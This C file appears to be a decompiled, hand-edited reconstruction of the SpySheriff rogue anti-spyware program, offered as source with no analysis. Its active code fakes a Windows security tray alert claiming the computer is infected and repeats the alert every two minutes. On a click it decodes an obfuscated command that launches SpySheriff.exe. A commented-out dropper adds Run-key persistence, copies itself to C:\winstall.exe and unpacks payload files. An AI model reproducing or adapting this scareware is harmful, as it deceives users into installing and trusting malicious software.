#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
//#include <shellapi.h>
#include <commctrl.h>
#include <errno.h>

#ifdef _WIN32_WCE
#else
#undef Shell_NotifyIcon
#define Shell_NotifyIcon Shell_NotifyIconW
#endif

size_t mbstowcs(wchar_t *, const char *, size_t);
typedef struct _NOTIFYICONDATAW {
  unsigned long int cbSize;
  HWND hWnd;
  unsigned int uID;
  unsigned int uFlags;
  unsigned int uCallbackMessage;
  HICON hIcon;
  wchar_t szTip[128];
  unsigned long int dwState;
  unsigned long int dwStateMask;
  wchar_t szInfo[256];
  _ANONYMOUS_UNION union {
    unsigned int uTimeout;
    unsigned int uVersion;
  } DUMMYUNIONNAME;
  wchar_t szInfoTitle[64];
  unsigned long int dwInfoFlags;
} NOTIFYICONDATAW,*PNOTIFYICONDATAW;
int WINAPI Shell_NotifyIcon(unsigned long int, PNOTIFYICONDATAW);
//extern int dword_4071A8; // weak
struct _NOTIFYICONDATAW stru_406FA8; // idb

//----- (00401710) --------------------------------------------------------
int sub_401710(const char *title, const char *text)
{
  //stru_406FA8.uFlags = 23;
  //stru_406FA8.uFlags = 0x00000023;
  stru_406FA8.uFlags = 0x17;
  stru_406FA8.dwInfoFlags = 2;
  //lstrcpynA(stru_406FA8.szInfo, text, 256);
  //lstrcpynA(stru_406FA8.szInfoTitle, title, 64);
  mbstowcs(stru_406FA8.szInfo, text, 256);
  mbstowcs(stru_406FA8.szInfoTitle, title, 64);
  stru_406FA8.uTimeout = 10000;
  return Shell_NotifyIcon(1, &stru_406FA8);
}

//----- (00401930) --------------------------------------------------------
int DialogFunc(HWND hWnd, unsigned __int16 a2, int a3, signed int a4)
{
  //printf("Debug: func: DialogFunc(%d, %d, %d, %d)\n", hWnd, a2, a3, a4);
#ifndef _WIN32_WCE
  unsigned int v5; // edx@10
  char v6[44]; // [sp+0h] [bp-22Ch]@10
  char CommandLine[512]; // [sp+2Ch] [bp-200h]@10
#endif

  if ( a2 == 272 ) {
    ShowWindow(hWnd, 0);
    return 0;
  }
  if ( a2 != 1103 ) return 0;
  if ( a4 == 513 ) {
    fprintf(stderr, "Left button down\n");
    //goto LABEL_10;
  }
/*
LABEL_13:
      sub_401710(
        "Your computer is infected!",
        "Windows has detected spyware infection!\r\nClick here to protect your computer from spyware!");
      return 0;
    goto LABEL_10;
*/
  if ( a4 == 516 ) {
    fprintf(stderr, "Right button down\n");
    //goto LABEL_13;
    sub_401710("Your computer is infected!", "Windows has detected spyware infection!\nClick here to protect your computer from spyware!");
    return 0;
    //goto LABEL_10;
  }
  if ( a4 != 1029 ) return 0;
LABEL_10:
#ifndef _WIN32_WCE
  memcpy(v6, "D;]Qsphsbn!Gjmft]TqzTifsjgg]TqzTifsjgg/fyf", sizeof(v6));
  memset(CommandLine, 0, sizeof(CommandLine));
  v5 = 0;
  if ( strlen(v6) != 1 )
  {
    do
    {
      CommandLine[v5] = v6[v5] - 1;
      ++v5;
    }
    while ( v5 < strlen(v6) - 1 );
  }
  CommandLine[v5] = 0;
  WinExec(CommandLine, 5u);
#endif
  return 0;
}
// 401930: using guessed type char var_22C[44];
// 401930: using guessed type const CHAR CmdLine[512];

//----- (00401A40) --------------------------------------------------------
void __stdcall StartAddress(int a1)
{
  while ( 1 ) {
    sub_401710(
      "Your computer is infected!",
      "Windows has detected spyware infection!\r\nClick here to protect your computer from spyware!");
    Sleep(0x1D4C0u);
    //Sleep(2000);
  }
}

/*
//----- (00401A70) --------------------------------------------------------
int sub_401A70(int a1)
{
  HANDLE v1; // eax@1
  void *v2; // ebx@1
  void *v3; // edi@1
  HANDLE v4; // eax@3
  void (__stdcall *v5)(unsigned long int); // ebp@3
  void (__stdcall *v6)(unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int); // edi@3
  HANDLE v7; // esi@3
  HANDLE v8; // eax@7
  void *v9; // esi@7
  DWORD v10; // eax@8
  DWORD v12; // eax@13
  void *v13; // eax@16
  HANDLE v14; // eax@19
  DWORD v15; // eax@21
  HMODULE v16; // eax@25
  void *v17; // ebp@26
  int v18; // edx@27
  int v19; // ebx@28
  void *v20; // edi@28
  const void *v21; // esi@30
  int v22; // ebx@30
  int v23; // esi@30
  int v24; // STB8_4@30
  HANDLE v25; // edi@30
  HANDLE v27; // edi@32
  HMODULE v28; // eax@34
  HKEY hKey; // [sp+CCh] [bp-A90h]@3
  DWORD NumberOfBytesRead; // [sp+D0h] [bp-A8Ch]@3
  HANDLE hFile; // [sp+D4h] [bp-A88h]@4
  HANDLE hObject; // [sp+D8h] [bp-A84h]@3
  DWORD nNumberOfBytesToWrite; // [sp+DCh] [bp-A80h]@11
  int v34; // [sp+E0h] [bp-A7Ch]@3
  DWORD cbData; // [sp+E4h] [bp-A78h]@3
  LPCVOID lpBuffer; // [sp+E8h] [bp-A74h]@11
  size_t v37; // [sp+ECh] [bp-A70h]@25
  char v38; // [sp+F0h] [bp-A6Ch]@30
  DWORD NumberOfBytesWritten; // [sp+F4h] [bp-A68h]@18
  size_t Size; // [sp+F8h] [bp-A64h]@11
  char v41; // [sp+FCh] [bp-A60h]@25
  int v42; // [sp+11Ch] [bp-A40h]@30
  const CHAR FileName; // [sp+15Ch] [bp-A00h]@3
  CHAR Filename; // [sp+35Ch] [bp-800h]@34
  BYTE Data; // [sp+55Ch] [bp-600h]@3
  CHAR ExistingFileName; // [sp+75Ch] [bp-400h]@25
  int v47; // [sp+95Ch] [bp-200h]@30

  v2 = 0;
  v1 = CreateFileA("C:\\Program Files\\SpySheriff\\SpySheriff.exe", 0x80000000u, 3u, 0, 4u, 0x80u, 0);
  v3 = v1;
  if ( v1 != (HANDLE)-1 && GetFileSize(v1, 0) > 0 )
    return 0;
  NumberOfBytesRead = 0;
  CloseHandle(v3);
  v6 = *(void (__stdcall **)(unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long))RegCreateKeyExA;
  cbData = 512;
  RegCreateKeyExA(
    HKEY_CURRENT_USER,
    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
    0,
    Class,
    0,
    1u,
    0,
    &hKey,
    0);
  RegQueryValueExA(hKey, "AppData", 0, 0, &Data, &cbData);
  v5 = *(void (__stdcall **)(unsigned long))RegCloseKey;
  RegCloseKey(hKey);
  cbData = 4;
  v34 = 0;
  RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Install", 0, Class, 0, 1u, 0, &hKey, 0);
  RegQueryValueExA(hKey, "Version", 0, 0, (LPBYTE)&v34, &cbData);
  RegCloseKey(hKey);
  ((void (*)(const CHAR *, const char *, ...))wsprintfA)(&FileName, "%s\\Install.dat", &Data);
  v4 = CreateFileA(&FileName, 0xC0000000u, 3u, 0, 4u, 0x80u, 0);
  v7 = v4;
  hObject = v4;
  if ( v4 == (HANDLE)-1 )
    hFile = 0;
  else
    hFile = (HANDLE)GetFileSize(v4, 0);
  CloseHandle(v7);
  if ( (unsigned int)hFile >= 0x927C0 )
  {
    v14 = CreateFileA(&FileName, 0xC0000000u, 3u, 0, 4u, 0x80u, 0);
    hFile = v14;
    if ( v14 == (HANDLE)-1 )
    {
      NumberOfBytesRead = 0;
    }
    else
    {
      v15 = GetFileSize(v14, 0);
      NumberOfBytesRead = v15;
      if ( v15 )
      {
        v2 = malloc(v15);
        ReadFile(hFile, v2, NumberOfBytesRead, &NumberOfBytesRead, 0);
      }
      v14 = hFile;
    }
    CloseHandle(v14);
    goto LABEL_25;
  }
  v8 = CreateFileA(&FileName, 0xC0000000u, 3u, 0, 4u, 0x80u, 0);
  v9 = v8;
  hObject = v8;
  if ( v8 == (HANDLE)-1 )
  {
    v10 = 0;
    NumberOfBytesRead = 0;
  }
  else
  {
    v10 = GetFileSize(v8, 0);
    NumberOfBytesRead = v10;
    if ( v10 )
    {
      v2 = malloc(v10);
      ReadFile(v9, v2, NumberOfBytesRead, &NumberOfBytesRead, 0);
      v10 = NumberOfBytesRead;
    }
  }
  if ( !sub_401770((void **)&lpBuffer, (int)&nNumberOfBytesToWrite, v10, (int)&v34, (int)&Size) )
  {
    CloseHandle(v9);
    DeleteFileA(&FileName);
    RegDeleteKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Install");
    return 0;
  }
  v12 = nNumberOfBytesToWrite;
  if ( nNumberOfBytesToWrite )
  {
    if ( Size > nNumberOfBytesToWrite + NumberOfBytesRead )
    {
      v7 = hObject;
LABEL_34:
      WriteFile(v7, lpBuffer, v12, &NumberOfBytesWritten, 0);
      CloseHandle(v7);
      v6(-2147483647, "SOFTWARE\\Install", 0, Class, 0, 2, 0, &hKey, 0);
      RegSetValueExA(hKey, "Version", 0, 4u, (const BYTE *)&v34, 4u);
      v5(hKey);
      v28 = GetModuleHandleA(0);
      GetModuleFileNameA(v28, &Filename, 0x200u);
      v6(-2147483647, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, Class, 0, 2, 0, &hKey, 0);
      RegSetValueExA(hKey, "SNInstall", 0, 1u, (const BYTE *)&Filename, strlen(&Filename));
      v5(hKey);
      return 0;
    }
    if ( v2 )
      v13 = realloc(v2, Size);
    else
      v13 = malloc(Size);
    v2 = v13;
    memcpy((char *)v13 + NumberOfBytesRead, lpBuffer, nNumberOfBytesToWrite);
    v7 = hObject;
    WriteFile(hObject, v13, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
    RegCreateKeyExA(
      HKEY_CURRENT_USER,
      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
      0,
      Class,
      0,
      2u,
      0,
      &hKey,
      0);
    RegDeleteValueA(hKey, "SNInstall");
    RegCloseKey(hKey);
    CloseHandle(v7);
    RegDeleteKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Install");
    v5 = *(void (__stdcall **)(unsigned long int))RegCloseKey;
    v6 = *(void (__stdcall **)(unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int))RegCreateKeyExA;
LABEL_25:
    v16 = GetModuleHandleA(0);
    GetModuleFileNameA(v16, &ExistingFileName, 0x200u);
    CopyFileA(&ExistingFileName, (LPCSTR)"C:\\winstall.exe", 0);
    v6(-2147483647, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, Class, 0, 2, 0, &hKey, 0);
    RegSetValueExA(hKey, "Windows installer", 0, 1u, "C:\\winstall.exe", strlen((const char *)"C:\\winstall.exe"));
    v5(hKey);
    if ( sub_4014A0((int)&v41, (int)&v37, (char)v2, (int)&v37) == 2 )
    {
      v17 = v2;
    }
    else
    {
      v17 = malloc(v37);
      sub_401553((int)&v41, v18, (char)v2, (unsigned int)v17);
    }
    v20 = (void *)*(_BYTE *)v17;
    CreateDirectoryA("C:\\Program Files", 0);
    CreateDirectoryA("C:\\Program Files\\SpySheriff", 0);
    v19 = 1;
    if ( (signed int)v20 > 0 )
    {
      hFile = v20;
      do
      {
        v21 = (char *)v17 + v19;
        v22 = v19 + 64;
        memcpy(&v42, v21, 0x40u);
        v23 = sub_4016E0((int)((char *)v17 + v22));
        v22 += 4;
        ((void (*)(int *, const char *, ...))wsprintfA)(&v47, "C:\\Program Files\\SpySheriff\\%s", &v42, v24);
        v25 = CreateFileA((LPCSTR)&v47, 0xC0000000u, 0, 0, 2u, 0x80u, 0);
        WriteFile(v25, (char *)v17 + v22, v23, (LPDWORD)&v38, 0);
        CloseHandle(v25);
        v19 = v23 + v22;
      }
      while ( hFile-- != HANDLE_FLAG_INHERIT );
      v7 = hObject;
    }
    v27 = CreateFileA("C:\\Program Files\\SpySheriff\\SpySheriff.dvm", 0x40000000u, 0, 0, 2u, 0x80u, 0);
    WriteFile(v27, &unk_406038, 0x64u, (LPDWORD)&v38, 0);
    CloseHandle(v27);
    v5 = *(void (__stdcall **)(unsigned long int))RegCloseKey;
    v6 = *(void (__stdcall **)(unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int, unsigned long int))RegCreateKeyExA;
    v12 = nNumberOfBytesToWrite;
    goto LABEL_34;
  }
  return 0;
}
// 4010F0: using guessed type int (__cdecl *wsprintfA)(_DWORD, _DWORD, _DWORD, _DWORD);
*/


int main(){
  //void *v4; // eax@1
  //signed int v5; // ebx@1
  //void *v6; // eax@4
  //void *v7; // esi@4
  int result; // eax@7
  INITCOMMONCONTROLSEX picce; // [sp+90h] [bp-24h]@1
  struct tagMSG Msg; // [sp+98h] [bp-1Ch]@11

  picce.dwSize = 8;
  picce.dwICC = 1;
  InitCommonControlsEx(&picce);
/*
  v5 = 0;
  v4 = CreateFileW(L"C:/Program Files/SpywareNo/SpywareNo.exe", -2147483648u, 3u, 0, 4u, 128u, 0);
  if ( v4 != (void *)-1 )
  {
    if ( GetFileSize(v4, 0) )
      v5 = 1;
  }
  v6 = CreateFileW(L"C:/Program Files/SpySheriff/SpySheriff.exe", 0x80000000u, 3u, 0, 4u, 0x80u, 0);
  v7 = v6;
  if ( v6 != (void *)-1 && GetFileSize(v6, 0) ) v5 = 1;
  CloseHandle(v7);
*/
  result = (int)CreateDialogParamW(GetModuleHandle(NULL), (wchar_t *)0x65, 0, (DLGPROC)DialogFunc, 0);
/*
  //dword_4071A8 = result;
  //perror("CreateDialogParam");
  //printf("Debug:\nerrno: %d\nresult: %d\n", errno, result);
  unsigned long int dwerror = GetLastError();
  char *ErrorMessage = NULL;
  FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, dwerror, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), &ErrorMessage, 0, NULL);
  printf("Debug:\nCreateDialogParamA: %s\n", ErrorMessage);
*/
  if ( result ) {
    //memset(&stru_406FA8, 0, sizeof(stru_406FA8));
    //stru_406FA8.cbSize = 504;
    stru_406FA8.cbSize = 952;
    stru_406FA8.uID = 1;
    stru_406FA8.uFlags = 0x17;
    void *ui = LoadLibraryW(L"wscui.cpl");
    if(ui){
      //stru_406FA8.hIcon = LoadIconW(ui, L"IDI_HAND");
      stru_406FA8.hIcon = LoadIconW(ui, (wchar_t *)502);
      if(!stru_406FA8.hIcon) goto load_system_icon;
    }else{
load_system_icon:
      stru_406FA8.hIcon = LoadIconW(0, (wchar_t *)0x7F01);
    }
    //strcpy(stru_406FA8.szTip, "Your computer is infected");
    mbstowcs(stru_406FA8.szTip, "Your computer is infected!", 27);
    //stru_406FA8.hWnd = (HWND)dword_4071A8;
    stru_406FA8.hWnd = (void *)result;
    stru_406FA8.uCallbackMessage = 1103;
    Shell_NotifyIcon(0, &stru_406FA8);
    /*dword_406FA0 = (int)*/CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, NULL);
    //if ( !v5 ) /*dword_406FA0 = (int)*/CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401A70, 0, 0, NULL);
    while ( GetMessageW(&Msg, 0, 0, 0) )
    {
      TranslateMessage(&Msg);
      DispatchMessageW(&Msg);
    }
    result = Msg.wParam;
  }
  return result;
}
